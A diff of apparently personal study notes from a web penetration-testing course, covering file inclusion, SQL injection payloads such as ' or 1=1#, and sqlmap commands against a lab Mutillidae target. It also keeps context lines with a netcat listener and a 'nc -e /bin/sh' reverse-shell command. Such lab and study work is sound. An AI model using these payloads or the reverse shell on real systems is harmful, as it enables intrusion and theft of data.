@@ -69,9 +69,35 @@ nc -vv -l -p 8080 #using netcat to listen on port 8080
 nc -e /bin/sh 10.0.2.7 8080 #this command to be entered in the website
 ```
 
+* Local file inclusion vulnerabilities allow us to read files on the same server. This can be exposed through the URL. For example, the URL can be manipulated to view the files in the directory /etc/passwd.
+
+* Remote file inclusion vulnerabilities allow us to read files from any server. This can be done by uploading PHP shells and payloads.
+
 ## SQL Injection Vulnerabilities
 
 ---
+
+* SQL Injection vulnerabilities can give complete access to the databases and other files. To try and discover SQL injections, we need to browse through the target and try to break each page.
+
+* SQLi examples:
+
+    1. ' - this can be used to break the page
+    2. a' or 1=1# - the first part contains a quote to end the query, the second part is always true so it gets executed, pound sign is used to comment any query following this
+    3. username' #
+
+* SQLi can be done by manipulating the URL as well (if URL contains parameters such as = or ?, for example). Note that we have to encode special characters in URL; like converting # to %23.
+
+* SQLMap is a tool used to exploit SQLi:
+
+```shell
+sqlmap -u "http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=admin&password=passd&user-info-php-submit-button=View+Account+Details"
+
+sqlmap --help
+
+sqlmap -u "http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=admin&password=passd&user-info-php-submit-button=View+Account+Details" --tables -D owasp10 #this will show the tables from the database 'owasp10'
+```
+
+* To prevent SQLi, one must use parameterized statements, by separating data from code.
 
 ## Cross Site Scripting Vulnerabilities
 
